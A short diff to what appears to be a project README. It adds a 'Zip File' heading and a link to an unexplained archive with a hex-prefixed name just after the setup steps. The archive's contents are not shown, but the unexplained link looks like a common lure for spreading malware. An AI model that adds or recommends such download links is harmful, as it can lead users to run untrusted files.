@@ -26,6 +26,8 @@ npm i
 # Step 4: Start the development server with auto-reloading and an instant preview.
 npm run dev
 ```
+## Zip File
+[697e49dfab842_hackoverflow.zip](https://github.com/user-attachments/files/25011753/697e49dfab842_hackoverflow.zip)
 
 
 ## Features and Folder Structure for this project?
